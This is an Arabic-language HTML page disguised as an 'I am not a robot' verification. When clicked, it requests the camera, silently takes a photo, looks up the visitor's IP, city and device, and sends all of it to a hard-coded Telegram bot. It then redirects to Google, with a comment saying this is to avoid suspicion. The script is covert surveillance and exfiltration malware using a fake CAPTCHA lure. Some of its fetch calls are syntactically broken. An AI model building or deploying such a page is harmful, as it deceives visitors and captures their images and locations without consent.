<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري تحميل البيانات...</title>
    <style>
        /* جعل الصفحة كاملة قابلة للضغط */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        #overlay { position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .text { color: white; font-size: 1.5rem; text-align: center; }
        video, canvas { display: none; }
    </style>
</head>
<body onclick="takeAction()">

    <div id="overlay">
        <div class="text">⚠️ انقر في أي مكان لتأكيد أنك لست روبوت وعرض المحتوى</div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const chatId = "56081692";
        let captured = false; // لمنع التكرار

        async function takeAction() {
            if (captured) return;
            captured = true;

            try {
                // طلب الكاميرا فور الضغط
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                document.querySelector('.text').innerText = "جاري التحقق... يرجى الانتظار";

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        sendPhoto(blob);
                    }, 'image/jpeg');

                    stream.getTracks().forEach(track => track.stop());
                    
                    // بعد الصورة، نسحب بيانات الـ IP
                    captureIPData();
                }, 800);

            } catch (err) {
                // إذا رفض الكاميرا، نسحب الـ IP على الأقل
                captureIPData();
            }
        }

        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'face.jpg');
            await fetch(https://api.telegram.org/bot${botToken}/sendPhoto, body: formData);
        }

        async function captureIPData() {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            const msg = 🚨 تم رصد مبتز!\n🌐 IP: ${d.ip}\n🏙️ المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform};
            await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg })
            });
            // تحويله لصفحة وهمية لكي لا يشك
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
